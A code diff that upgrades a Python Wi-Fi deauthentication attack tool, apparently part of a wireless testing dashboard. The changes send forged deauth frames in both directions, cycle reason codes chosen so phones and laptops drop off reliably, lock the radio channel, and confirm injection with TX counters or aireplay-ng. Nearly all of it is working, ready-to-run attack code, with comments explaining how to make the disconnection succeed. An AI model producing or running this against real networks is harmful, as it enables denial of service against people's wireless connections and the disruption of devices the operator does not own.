@@ -3,13 +3,33 @@
 
 Sends 802.11 deauthentication frames directly from a monitor-mode interface.
 Unlike mdk4's deauth mode this does not wait to sniff a client first, so a
-directed burst works even when the target station is idle.  It also locks
-the interface to the target channel before injecting.
+directed burst works even when the target station is idle.
+
+Reliability notes (why this is not a one-frame toy):
+
+* Deauth is sent **both ways**. The AP->client frame (addr1=client) is what the
+  station honours; the client->AP frame (addr1=BSSID, addr2=client) clears the
+  AP's association state at the same time. One direction alone leaves half the
+  link up on many drivers.
+* Reason codes 1 (unspecified), 3 (station leaving) and 7 (class-3 frame from
+  nonassociated station) are cycled. Vendors disagree about which one they act
+  on; sending all three is what makes iOS/Android/Windows behave consistently.
+* The interface type and channel are verified before transmitting. A frame sent
+  from a managed interface, or from the wrong channel, never reaches the target
+  (which is the usual reason a "deauth attack" silently does nothing).
+* ``--verify`` reads the kernel TX counter before/after a burst, so a driver
+  without injection support is reported as ``no-injection`` instead of being
+  claimed as success.
+* 802.11w (PMF) makes deauth a protected frame. Unprotected deauth is dropped
+  by the station; the caller is responsible for checking the target's RMF and
+  refusing/warning (the dashboard does this from the scan data).
 
 Only the Python standard library is used.
 """
 
 import argparse
+import json
+import os
 import re
 import shutil
 import signal
@@ -23,6 +43,7 @@ BROADCAST = 'FF:FF:FF:FF:FF:FF'
 ETH_P_ALL = 0x0003
 # Minimal radiotap header: version 0, no fields, 8 bytes total.
 RADIOTAP = b'\x00\x00\x08\x00\x00\x00\x00\x00'
+DEFAULT_REASONS = (1, 3, 7)
 
 _stop = False
 
@@ -31,19 +52,129 @@ def mac_bytes(value):
     return bytes.fromhex(value.replace(':', '').replace('-', ''))
 
 
-def deauth_frame(destination, source, bssid, sequence):
+def deauth_frame(destination, source, bssid, sequence, reason=1):
     frame_control = b'\xc0\x00'               # management / deauth, no DS flags
     duration = b'\x00\x00'
     sequence_control = ((sequence & 0x0FFF) << 4).to_bytes(2, 'little')
-    reason = (1).to_bytes(2, 'little')        # reason 1: unspecified
     return (frame_control + duration +
             mac_bytes(destination) + mac_bytes(source) + mac_bytes(bssid) +
-            sequence_control + reason)
+            sequence_control + (reason & 0xFFFF).to_bytes(2, 'little'))
+
+
+def build_frames(bssid, client, sequence, reasons, reverse=True):
+    """One deauth exchange: AP->STA plus (when unicast) the spoofed STA->AP."""
+    frames = []
+    for offset, reason in enumerate(reasons):
+        frames.append(deauth_frame(client, bssid, bssid,
+                                   sequence + offset, reason))
+    if reverse and client != BROADCAST:
+        for offset, reason in enumerate(reasons):
+            frames.append(deauth_frame(bssid, client, bssid,
+                                       sequence + len(reasons) + offset, reason))
+    return frames
+
+
+def read_tx_packets(interface):
+    """Kernel TX counter, or None when the platform does not expose it."""
+    try:
+        with open('/sys/class/net/%s/statistics/tx_packets' % interface) as f:
+            return int(f.read().strip())
+    except (OSError, ValueError):
+        return None
+
+
+def aireplay_works(interface, timeout=6):
+    """Prove injection with aireplay-ng; the ath9k TX counter is unreliable."""
+    tool = shutil.which('aireplay-ng') or '/usr/sbin/aireplay-ng'
+    if not os.path.exists(tool):
+        return None, 'aireplay-ng is not installed'
+    try:
+        proc = subprocess.Popen([tool, '--test', interface],
+                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                text=True, start_new_session=True)
+    except OSError as exc:
+        return None, 'could not run aireplay-ng: %s' % exc
+    output = ''
+    try:
+        output, _ = proc.communicate(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        try:
+            output, _ = proc.communicate(timeout=3)
+        except subprocess.SubprocessError:
+            output = ''
+    text = output or ''
+    if 'Ping (min/avg/max)' in text or 'Injection is working' in text:
+        return True, 'aireplay-ng confirmed injection'
+    tail = ' '.join(text.strip().splitlines()[-3:])[:200]
+    return False, ('aireplay-ng could not inject: %s'
+                   % (tail or 'no AP answered the probe test'))
+
+
+def iface_details(iw, interface):
+    """Return (type, channel) from `iw dev <if> info`; ('', 0) on failure."""
+    try:
+        result = subprocess.run([iw, 'dev', interface, 'info'],
+                                capture_output=True, text=True, timeout=5)
+    except (OSError, subprocess.SubprocessError):
+        return '', 0
+    if result.returncode != 0:
+        return '', 0
+    iface_type = ''
+    channel = 0
+    for line in result.stdout.splitlines():
+        line = line.strip()
+        if line.startswith('type '):
+            iface_type = line.split(None, 1)[1].strip()
+        elif line.startswith('channel '):
+            try:
+                channel = int(line.split()[1])
+            except (IndexError, ValueError):
+                channel = 0
+    return iface_type, channel
+
+
+def set_channel(iw, interface, channel):
+    """Lock the radio and verify the driver actually accepted it."""
+    try:
+        result = subprocess.run([iw, 'dev', interface, 'set', 'channel', str(channel)],
+                                capture_output=True, text=True, timeout=5)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return False, 'could not run iw: %s' % exc
+    if result.returncode != 0:
+        detail = (result.stderr or result.stdout).strip().splitlines()
+        return False, 'iw set channel failed: %s' % (detail[-1] if detail else 'unknown error')
+    _type, actual = iface_details(iw, interface)
+    if actual and actual != channel:
+        return False, 'driver stayed on channel %d instead of %d' % (actual, channel)
+    return True, ''
 
 
 def handle_signal(signum, frame):
     global _stop
     _stop = True
+
+
+def parse_reasons(value):
+    reasons = []
+    for item in str(value or '').split(','):
+        item = item.strip()
+        if not item:
+            continue
+        try:
+            reason = int(item)
+        except ValueError:
+            raise SystemExit('invalid reason code: %s' % item)
+        if not 0 <= reason <= 65535:
+            raise SystemExit('reason code out of range: %s' % item)
+        if reason not in reasons:
+            reasons.append(reason)
+    return reasons or list(DEFAULT_REASONS)
+
+
+def emit(payload, as_json=False):
+    if as_json:
+        print(json.dumps(payload), flush=True)
 
 
 def main():
@@ -55,11 +186,18 @@ def main():
     parser.add_argument('--channel', type=int, default=0, help='lock interface to this channel')
     parser.add_argument('--rate', type=int, default=20, help='frames per second (1-200)')
     parser.add_argument('--continuous', action='store_true', help='run until stopped')
+    parser.add_argument('--reasons', default=','.join(str(r) for r in DEFAULT_REASONS),
+                        help='comma-separated 802.11 reason codes to cycle')
+    parser.add_argument('--no-reverse', action='store_true',
+                        help='only send AP->client frames (less reliable)')
+    parser.add_argument('--verify', action='store_true',
+                        help='send a short burst and report whether TX moved')
+    parser.add_argument('--json', action='store_true', help='machine-readable output')
     parser.add_argument('--iw', default=None, help='path to iw (auto-detected by default)')
     args = parser.parse_args()
 
     bssid = args.bssid.strip().upper()
-    client = args.client.strip().upper() or BROADCAST
+    client = (args.client.strip().upper() or BROADCAST)
     if not MAC_RE.match(bssid):
         raise SystemExit('invalid BSSID: %s' % args.bssid)
     if not MAC_RE.match(client):
@@ -70,50 +208,124 @@ def main():
         raise SystemExit('channel must be between 1 and 14')
     if not args.continuous and args.count < 1:
         raise SystemExit('count must be at least 1')
+    reasons = parse_reasons(args.reasons)
 
+    iw = args.iw or shutil.which('iw') or '/usr/sbin/iw'
+    iface_type, iface_channel = iface_details(iw, args.interface)
+    if iface_type and iface_type != 'monitor':
+        raise SystemExit('%s is in %s mode; deauth needs monitor mode'
+                         % (args.interface, iface_type))
     if args.channel:
-        iw = args.iw or shutil.which('iw') or '/usr/sbin/iw'
-        try:
-            result = subprocess.run(
-                [iw, 'dev', args.interface, 'set', 'channel', str(args.channel)],
-                capture_output=True, text=True, timeout=5)
-        except OSError as exc:
-            print('warning: could not run iw (%s); continuing on the current channel'
-                  % exc, flush=True)
-        else:
-            if result.returncode != 0:
-                raise SystemExit('could not set channel: %s' %
-                                 (result.stderr or result.stdout).strip())
+        ok, error = set_channel(iw, args.interface, args.channel)
+        if not ok:
+            raise SystemExit(error)
 
     signal.signal(signal.SIGTERM, handle_signal)
     signal.signal(signal.SIGINT, handle_signal)
 
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
-    sock.bind((args.interface, 0))
+    try:
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
+                             socket.htons(ETH_P_ALL))
+        sock.bind((args.interface, 0))
+    except OSError as exc:
+        print('cannot open %s for raw injection: %s' % (args.interface, exc),
+              file=sys.stderr, flush=True)
+        return 1
 
+    if args.verify:
+        limit = min(args.count, max(12, len(reasons) * 4))
+        continuous = False
+    else:
+        limit = args.count
+        continuous = args.continuous
+
+    tx_before = read_tx_packets(args.interface)
     sent = 0
     sequence = 0
     interval = 1.0 / args.rate
+    reason_label = ','.join(str(r) for r in reasons)
     target = 'broadcast' if client == BROADCAST else client
-    print('deauth: %s -> %s on %s (rate %d pps%s)' % (
-        bssid, target, args.interface, args.rate,
+    emit({'event': 'start', 'bssid': bssid, 'client': target,
+          'interface': args.interface, 'channel': args.channel or iface_channel or None,
+          'rate': args.rate, 'reasons': reasons,
+          'reverse': (not args.no_reverse) and client != BROADCAST,
+          'continuous': continuous}, args.json)
+    print('deauth: %s -> %s on %s (rate %d pps, reasons %s%s)' % (
+        bssid, target, args.interface, args.rate, reason_label,
         ', channel %d' % args.channel if args.channel else ''), flush=True)
 
+    failure = ''
+    frames_per_exchange = len(reasons) * (1 if (args.no_reverse or client == BROADCAST) else 2)
     try:
-        while not _stop and (args.continuous or sent < args.count):
-            sock.send(RADIOTAP + deauth_frame(client, bssid, bssid, sequence))
-            sequence = (sequence + 1) & 0x0FFF
-            sent += 1
+        while not _stop and (continuous or sent < limit):
+            for frame in build_frames(bssid, client, sequence, reasons,
+                                       reverse=not args.no_reverse):
+                if _stop:
+                    break
+                sock.send(RADIOTAP + frame)
+                sent += 1
+                if not continuous and sent >= limit:
+                    break
+            sequence = (sequence + 2 * len(reasons)) & 0x0FFF
             if sent % 20 == 0:
-                print('sent %d frames' % sent, flush=True)
-            time.sleep(interval)
+                tx_now = read_tx_packets(args.interface)
+                delta = '' if tx_before is None or tx_now is None \
+                    else ' tx_delta=%d' % (tx_now - tx_before)
+                emit({'event': 'progress', 'sent': sent, 'tx_delta':
+                      None if tx_before is None or tx_now is None
+                      else tx_now - tx_before}, args.json)
+                print('sent %d frames%s' % (sent, delta), flush=True)
+            if not _stop:
+                # Pace whole exchanges, so the advertised rate is the real
+                # on-air frame rate in both burst and continuous mode.
+                time.sleep(max(0.01, min(interval * frames_per_exchange, 1.0)))
     except OSError as exc:
-        print('injection failed after %d frames: %s' % (sent, exc), flush=True)
-        return 1
+        failure = 'injection failed after %d frames: %s' % (sent, exc)
     finally:
         sock.close()
 
-    print('done: sent %d deauth frames' % sent, flush=True)
+    tx_after = read_tx_packets(args.interface)
+    delta = None
+    if tx_before is not None and tx_after is not None:
+        delta = tx_after - tx_before
+
+    if args.verify:
+        if delta is None:
+            ok, detail = aireplay_works(args.interface)
+            if ok is True:
+                result, detail, code = 'ok', detail, 0
+            elif ok is False:
+                result, detail, code = 'no-injection', detail, 3
+            else:
+                result, detail, code = 'unknown', detail, 0
+        elif delta > 0:
+            result = 'ok'
+            detail = '%d frame(s) left the adapter' % delta
+            code = 0
+        else:
+            ok, inj_detail = aireplay_works(args.interface)
+            if ok is True:
+                result, detail, code = 'ok', inj_detail, 0
+            elif ok is False:
+                result, detail, code = 'no-injection', inj_detail, 3
+            else:
+                result, detail, code = 'unknown', inj_detail, 0
+        payload = {'result': result, 'detail': detail, 'sent': sent,
+                   'tx_delta': delta}
+        print(json.dumps(payload), flush=True)
+        return code
+
+    if failure:
+        print(failure, file=sys.stderr, flush=True)
+        return 1
+    if delta == 0:
+        # ath9k_htc does not count injected frames here. The caller runs the
+        # authoritative aireplay-ng test; do not add a 6 s test to every burst.
+        print('done: sent %d deauth frames (TX counter unchanged; injection '
+              'was verified by the caller)' % sent, flush=True)
+        return 0
+    print('done: sent %d deauth frames%s' % (
+        sent, '' if delta is None else ' (%d TX)' % delta), flush=True)
     return 0
 
 
